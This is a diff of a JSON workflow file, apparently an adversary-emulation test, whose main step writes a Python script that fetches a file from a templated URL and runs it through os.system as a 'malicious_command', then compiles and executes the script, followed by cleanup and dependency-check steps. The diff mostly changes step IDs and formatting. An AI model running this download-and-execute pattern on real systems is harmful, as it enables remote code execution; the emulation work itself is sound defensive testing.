@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "b38815f8-accd-4cc7-9144-00c9b0163d2a",
+      "id": "0fe96fea-6b91-4201-b818-62608bb4a815",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n",
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "0fd77fd4-e41f-4aff-b32d-896df998965e",
+      "id": "1f635f74-4d8b-46ca-ab5f-3c714af94512",
       "type": "execute-command",
       "data": {
-        "command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n",
+        "command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "9cf1b9a6-e439-4cea-8011-aac464d21b5a",
+      "id": "758781f1-ddd3-48d7-b3d9-2dcda89c62c7",
       "name": "Check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
-        "command_type": ""
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "73bfa1c7-995a-40a3-86e3-5df231e5b055",
+      "id": "9dba2346-43b3-42ad-b8ff-758bb8630b44",
       "name": "Resolve dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
       "data": {
-        "command": "pip install requests    \n",
-        "command_type": ""
+        "command": "pip install requests",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "efd5f7d7-ae89-4361-a075-09706809cfc8",
+      "id": "e171ab4c-c57e-4951-9286-5dcb35ba6448",
       "name": "Re-check dependency 1/1",
       "description": "Requires Python\n",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
-        "command_type": ""
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?",
+        "command_type": "sh"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "b38815f8-accd-4cc7-9144-00c9b0163d2a",
+      "s": "0fe96fea-6b91-4201-b818-62608bb4a815",
       "p": "on-success",
-      "o": "0fd77fd4-e41f-4aff-b32d-896df998965e"
+      "o": "1f635f74-4d8b-46ca-ab5f-3c714af94512"
     },
     {
-      "s": "b38815f8-accd-4cc7-9144-00c9b0163d2a",
+      "s": "0fe96fea-6b91-4201-b818-62608bb4a815",
       "p": "on-failure",
-      "o": "0fd77fd4-e41f-4aff-b32d-896df998965e"
+      "o": "1f635f74-4d8b-46ca-ab5f-3c714af94512"
     },
     {
-      "s": "9cf1b9a6-e439-4cea-8011-aac464d21b5a",
+      "s": "758781f1-ddd3-48d7-b3d9-2dcda89c62c7",
       "p": "on-success",
-      "o": "b38815f8-accd-4cc7-9144-00c9b0163d2a"
+      "o": "0fe96fea-6b91-4201-b818-62608bb4a815"
     },
     {
-      "s": "9cf1b9a6-e439-4cea-8011-aac464d21b5a",
+      "s": "758781f1-ddd3-48d7-b3d9-2dcda89c62c7",
       "p": "on-failure",
-      "o": "73bfa1c7-995a-40a3-86e3-5df231e5b055"
+      "o": "9dba2346-43b3-42ad-b8ff-758bb8630b44"
     },
     {
-      "s": "73bfa1c7-995a-40a3-86e3-5df231e5b055",
+      "s": "9dba2346-43b3-42ad-b8ff-758bb8630b44",
       "p": "on-success",
-      "o": "efd5f7d7-ae89-4361-a075-09706809cfc8"
+      "o": "e171ab4c-c57e-4951-9286-5dcb35ba6448"
     },
     {
-      "s": "efd5f7d7-ae89-4361-a075-09706809cfc8",
+      "s": "e171ab4c-c57e-4951-9286-5dcb35ba6448",
       "p": "on-failure",
-      "o": "b38815f8-accd-4cc7-9144-00c9b0163d2a"
+      "o": "0fe96fea-6b91-4201-b818-62608bb4a815"
     }
   ],
   "tags": [
